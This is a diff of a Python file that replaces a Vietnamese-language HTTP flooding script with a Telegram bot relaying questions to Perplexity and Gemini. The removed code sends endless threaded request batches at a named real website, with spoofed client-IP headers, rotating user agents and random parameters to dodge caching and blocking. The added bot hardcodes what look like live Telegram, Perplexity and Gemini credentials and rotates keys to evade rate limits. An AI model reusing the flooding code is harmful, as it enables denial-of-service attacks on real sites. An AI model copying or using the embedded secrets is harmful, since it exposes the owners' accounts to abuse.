@@ -1,232 +1,242 @@
+import logging
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler
 import requests
-import time
-import signal
-import sys
 import os
-import platform
 import random
-import string
-from concurrent.futures import ThreadPoolExecutor
-from datetime import datetime
+from datetime import datetime, timedelta
+import google.generativeai as genai
 
-URL = "https://tuoithonro.com/"
-REQUESTS = 10000
+TELEGRAM_API_TOKEN = '7662473826:AAHIqXyeDGtiuQDEHPuiYMUY4Ha7iiVHKQc'
 
-if platform.system() == "Windows":
-    CONCURRENCY = min(200, os.cpu_count() * 5)
-else:
-    CONCURRENCY = min(500, os.cpu_count() * 10)
-
-is_paused = False
-is_running = True
-total_success = 0
-total_error = 0
-start_time_global = None
-
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 OPR/78.0.4093.147",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36"
+PERPLEXITY_API_KEYS = [
+    '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',
+    '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',
+    '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',
+    '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'
 ]
 
-def get_random_ip():
-    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
+GEMINI_API_KEY = 'AIzaSyC_qiwDK41Rmo3qaW5QCG1L2HH5r-Efa2w'
 
-def get_random_string(length=10):
-    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
+genai.configure(api_key=GEMINI_API_KEY)
 
-def signal_handler(sig, frame):
-    global is_paused, is_running
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+user_models = {}
+DEFAULT_MODEL = "sonar-pro"
+
+api_key_usage = {key: {'count': 0, 'last_used': datetime.now() - timedelta(minutes=5)} for key in PERPLEXITY_API_KEYS}
+
+MODEL_GROUPS = {
+    "perplexity": {
+        "name": "Perplexity",
+        "models": {
+            "sonar-pro": {"name": "Sonar Pro", "api_id": "sonar-pro", "api_type": "perplexity"}
+        }
+    },
+    "gemini": {
+        "name": "Google Gemini",
+        "models": {
+            "gemini-flash": {"name": "Gemini Advanced 2.0 Flash", "api_id": "gemini-1.5-flash", "api_type": "gemini"}
+        }
+    }
+}
+
+AVAILABLE_MODELS = {}
+for group in MODEL_GROUPS.values():
+    AVAILABLE_MODELS.update(group["models"])
+
+def start(update: Update, context: CallbackContext) -> None:
+    user_id = update.effective_user.id
+    user_models[user_id] = DEFAULT_MODEL
     
-    if is_paused:
-        print("\n[!] Đang thoát chương trình...")
-        is_running = False
-    else:
-        print("\n[!] Đã tạm dừng. Nhấn Ctrl+C lần nữa để thoát hoặc Enter để tiếp tục...")
-        is_paused = True
+    update.message.reply_text(
+        'Chào bạn! Đây là mô hình AI của Mr.Phong.\n\n'
+        'Bạn có thể gửi câu hỏi trực tiếp hoặc chọn mô hình AI bằng lệnh /model.\n'
+        'Để xem các mô hình theo nhóm, sử dụng lệnh /groups.\n\n'
+        'Mô hình mặc định: ' + AVAILABLE_MODELS[DEFAULT_MODEL]["name"]
+    )
 
-def resume_execution():
-    global is_paused
-    print("[+] Tiếp tục thực thi...")
-    is_paused = False
+def show_model_groups(update: Update, context: CallbackContext) -> None:
+    keyboard = []
+    for group_id, group_info in MODEL_GROUPS.items():
+        keyboard.append([InlineKeyboardButton(group_info["name"], callback_data=f"group_{group_id}")])
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    update.message.reply_text('Chọn nhóm mô hình AI:', reply_markup=reply_markup)
 
-def make_request():
-    try:
-        random_params = f"?{get_random_string(5)}={get_random_string(8)}&_={int(time.time() * 1000)}"
-        full_url = URL + random_params
+def show_models(update: Update, context: CallbackContext) -> None:
+    keyboard = []
+    for model_id, model_info in AVAILABLE_MODELS.items():
+        keyboard.append([InlineKeyboardButton(model_info["name"], callback_data=f"model_{model_id}")])
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    update.message.reply_text('Chọn mô hình AI:', reply_markup=reply_markup)
+
+def button_callback(update: Update, context: CallbackContext) -> None:
+    query = update.callback_query
+    query.answer()
+    
+    if query.data.startswith("group_"):
+        group_id = query.data.replace("group_", "")
+        keyboard = []
+        for model_id, model_info in MODEL_GROUPS[group_id]["models"].items():
+            keyboard.append([InlineKeyboardButton(model_info["name"], callback_data=f"model_{model_id}")])
         
-        x_forwarded_for = get_random_ip()
-        user_agent = random.choice(USER_AGENTS)
+        keyboard.append([InlineKeyboardButton("⬅️ Quay lại", callback_data="back_to_groups")])
         
-        headers = {
-            "User-Agent": user_agent,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Connection": "keep-alive",
-            "Upgrade-Insecure-Requests": "1",
-            "Cache-Control": "max-age=0",
-            "X-Forwarded-For": x_forwarded_for,
-            "X-Real-IP": x_forwarded_for,
-            "X-Client-IP": x_forwarded_for,
-            "CF-Connecting-IP": x_forwarded_for,
-            "True-Client-IP": x_forwarded_for,
-            "Referer": f"https://www.google.com/search?q=site:{URL.split('//')[1].split('/')[0]}+{get_random_string(8)}",
-            "Sec-Fetch-Dest": "document",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-Site": "cross-site",
-            "Sec-Fetch-User": "?1",
-            "DNT": "1"
-        }
-        
-        cookies = {
-            f"cookie_{get_random_string(5)}": get_random_string(10),
-            "session_id": get_random_string(32),
-            "_ga": f"GA1.2.{random.randint(1000000, 9999999)}.{int(time.time() - random.randint(1000000, 9999999))}",
-            "_gid": f"GA1.2.{random.randint(1000000, 9999999)}.{int(time.time())}"
-        }
-        
-        session = requests.Session()
-        
-        response = session.get(
-            full_url, 
-            headers=headers, 
-            cookies=cookies, 
-            timeout=10, 
-            allow_redirects=True,
-            verify=False
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        query.edit_message_text(
+            text=f"Mô hình {MODEL_GROUPS[group_id]['name']}:",
+            reply_markup=reply_markup
         )
+    
+    elif query.data == "back_to_groups":
+        keyboard = []
+        for group_id, group_info in MODEL_GROUPS.items():
+            keyboard.append([InlineKeyboardButton(group_info["name"], callback_data=f"group_{group_id}")])
         
-        return response.status_code
-    except requests.RequestException:
-        return None
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        query.edit_message_text(text='Chọn nhóm mô hình AI:', reply_markup=reply_markup)
+    
+    elif query.data.startswith("model_"):
+        model_id = query.data.replace("model_", "")
+        user_id = update.effective_user.id
+        user_models[user_id] = model_id
+        
+        query.edit_message_text(text=f"Đã chọn mô hình: {AVAILABLE_MODELS[model_id]['name']}")
 
-def send_requests(batch_num):
-    global total_success, total_error
+def handle_message(update: Update, context: CallbackContext) -> None:
+    user_id = update.effective_user.id
+    user_message = update.message.text
     
-    start_time = time.time()
-    success_count = 0
-    error_count = 0
+    model = user_models.get(user_id, DEFAULT_MODEL)
+    model_info = AVAILABLE_MODELS[model]
+    model_name = model_info["name"]
+    api_type = model_info["api_type"]
     
-    batch_size = 200
-    total_batches = (REQUESTS + batch_size - 1) // batch_size
+    processing_message = update.message.reply_text(f"Đang xử lý yêu cầu của bạn với {model_name}...")
     
-    for batch in range(total_batches):
-        while is_paused and is_running:
-            time.sleep(0.1)
-            
-        if not is_running:
-            return
-            
-        remaining = min(batch_size, REQUESTS - batch * batch_size)
-        if remaining <= 0:
-            break
-            
-        print(f"[*] Đang xử lý batch nội bộ {batch+1}/{total_batches} ({remaining} requests)")
-        
-        with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
-            futures = [executor.submit(make_request) for _ in range(remaining)]
-            
-            for future in futures:
-                while is_paused and is_running:
-                    time.sleep(0.1)
-                if not is_running:
-                    return
-                    
-                result = future.result()
-                if result and 200 <= result < 400:
-                    success_count += 1
-                else:
-                    error_count += 1
-        
-        time.sleep(random.uniform(0.5, 1.5))
+    if api_type == "perplexity":
+        response = get_perplexity_response(user_message, model)
+    elif api_type == "gemini":
+        response = get_gemini_response(user_message, model)
+    else:
+        response = "Loại API không được hỗ trợ."
     
-    elapsed_time = time.time() - start_time
+    processing_message.delete()
     
-    total_success += success_count
-    total_error += error_count
+    reply_text = f"🤖 {model_name}:\n\n{response}"
     
-    print(f"\n[+] Kết quả Batch #{batch_num}:")
-    print(f"    - Đã hoàn thành {REQUESTS} requests trong {elapsed_time:.2f} giây")
-    print(f"    - Thành công: {success_count}, Lỗi: {error_count}")
-    print(f"    - Tốc độ: {REQUESTS/elapsed_time:.2f} requests/giây")
+    if len(reply_text) > 4000:
+        parts = [reply_text[i:i+4000] for i in range(0, len(reply_text), 4000)]
+        for i, part in enumerate(parts):
+            if i == 0:
+                update.message.reply_text(part)
+            else:
+                update.message.reply_text(f"(tiếp theo) {part}")
+    else:
+        update.message.reply_text(reply_text)
 
-def print_stats():
-    global total_success, total_error, start_time_global
+def get_api_key():
+    now = datetime.now()
     
-    if start_time_global:
-        total_time = time.time() - start_time_global
-        total_requests = total_success + total_error
-        
-        if total_requests > 0:
-            print("\n" + "="*50)
-            print(f"THỐNG KÊ TỔNG HỢP ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})")
-            print("="*50)
-            print(f"URL đích:            {URL}")
-            print(f"Thời gian chạy:      {total_time:.2f} giây")
-            print(f"Tổng số requests:    {total_requests}")
-            print(f"Requests thành công: {total_success} ({total_success/total_requests*100:.2f}%)")
-            print(f"Requests lỗi:        {total_error} ({total_error/total_requests*100:.2f}%)")
-            print(f"Tốc độ trung bình:   {total_requests/total_time:.2f} requests/giây")
-            print("="*50)
+    for key, data in api_key_usage.items():
+        if (now - data['last_used']).total_seconds() > 60:
+            data['count'] = 0
+            data['last_used'] = now - timedelta(minutes=1)
+    
+    selected_key = min(api_key_usage.items(), key=lambda x: x[1]['count'])[0]
+    
+    api_key_usage[selected_key]['count'] += 1
+    api_key_usage[selected_key]['last_used'] = now
+    
+    return selected_key
 
-def main():
-    global is_paused, is_running, start_time_global
+def get_perplexity_response(query: str, model_key: str) -> str:
+    url = 'https://api.perplexity.ai/chat/completions'
+    api_key = get_api_key()
+    model_info = AVAILABLE_MODELS[model_key]
+    model_id = model_info["api_id"]
+    system_prompt = model_info.get("system_prompt", "Bạn là trợ lý AI hữu ích. Hãy trả lời người dùng một cách chính xác và hữu ích.")
     
-    signal.signal(signal.SIGINT, signal_handler)
+    headers = {
+        'Authorization': f'Bearer {api_key}',
+        'Content-Type': 'application/json'
+    }
+    data = {
+        "model": model_id,
+        "messages": [
+            {"role": "system", "content": system_prompt},
+            {"role": "user", "content": query}
+        ]
+    }
     
     try:
-        try:
-            import urllib3
-            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-        except:
-            pass
-        
-        print("\n" + "="*50)
-        print("CHƯƠNG TRÌNH GỬI REQUESTS NÂNG CAO")
-        print("="*50)
-        print(f"URL đích:             {URL}")
-        print(f"Số lượng requests:    {REQUESTS}")
-        print(f"Số luồng đồng thời:   {CONCURRENCY}")
-        print(f"Hệ điều hành:         {platform.system()} {platform.release()}")
-        print(f"Số lõi CPU:           {os.cpu_count()}")
-        print("="*50)
-        print("[i] Nhấn Ctrl+C để tạm dừng/thoát")
-        print("="*50 + "\n")
-        
-        start_time_global = time.time()
-        
-        count = 1
-        while is_running:
-            if not is_paused:
-                print(f"\n[*] Bắt đầu Batch #{count}")
-                send_requests(count)
-                count += 1
-                
-                wait_time = random.uniform(1.0, 3.0)
-                print(f"[i] Đợi {wait_time:.2f} giây trước khi tiếp tục...")
-                time.sleep(wait_time)
-            else:
-                input()
-                resume_execution()
-                
+        response = requests.post(url, headers=headers, json=data)
+        if response.status_code == 200:
+            return response.json().get('choices')[0].get('message').get('content')
+        elif response.status_code == 429:
+            logger.warning(f"API key {api_key} đã đạt giới hạn tốc độ. Thử lại với key khác.")
+            api_key_usage[api_key]['count'] += 10
+            return get_perplexity_response(query, model_key)
+        else:
+            error_message = f'Có lỗi xảy ra khi gọi API Perplexity. Mã lỗi: {response.status_code}'
+            try:
+                error_detail = response.json()
+                error_message += f', Chi tiết: {error_detail}'
+            except:
+                error_message += f', Chi tiết: {response.text}'
+            logger.error(error_message)
+            return error_message
     except Exception as e:
-        print(f"\n[!] Lỗi không mong muốn: {str(e)}")
-    finally:
-        print_stats()
-        print("\n[!] Chương trình đã kết thúc")
+        error_message = f'Có lỗi xảy ra với Perplexity API: {str(e)}'
+        logger.error(error_message)
+        return error_message
 
-if __name__ == "__main__":
+def get_gemini_response(query: str, model_key: str) -> str:
+    model_info = AVAILABLE_MODELS[model_key]
+    model_id = model_info["api_id"]
+    system_prompt = model_info.get("system_prompt", "Bạn là trợ lý AI hữu ích. Hãy trả lời người dùng một cách chính xác và hữu ích.")
+    
+    try:
+        model = genai.GenerativeModel(model_id)
+        full_prompt = f"{system_prompt}\n\nUser: {query}"
+        response = model.generate_content(full_prompt)
+        return response.text
+    except Exception as e:
+        error_message = f'Có lỗi xảy ra với Gemini API: {str(e)}'
+        logger.error(error_message)
+        return error_message
+
+def test_gemini(update: Update, context: CallbackContext) -> None:
+    update.message.reply_text("Đang kiểm tra kết nối với API Gemini...")
+    
+    try:
+        model = genai.GenerativeModel('gemini-1.5-flash')
+        response = model.generate_content("Xin chào, đây là tin nhắn kiểm tra.")
+        update.message.reply_text(f"Kết nối thành công! Phản hồi: {response.text}")
+    except Exception as e:
+        update.message.reply_text(f"Lỗi kết nối: {str(e)}")
+
+def main() -> None:
+    updater = Updater(TELEGRAM_API_TOKEN)
+    dispatcher = updater.dispatcher
+
+    dispatcher.add_handler(CommandHandler("start", start))
+    dispatcher.add_handler(CommandHandler("model", show_models))
+    dispatcher.add_handler(CommandHandler("groups", show_model_groups))
+    dispatcher.add_handler(CommandHandler("test_gemini", test_gemini))
+    dispatcher.add_handler(CallbackQueryHandler(button_callback))
+    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
+
+    logger.info("Bot đã khởi động")
+    updater.start_polling()
+    updater.idle()
+
+if __name__ == '__main__':
     main()
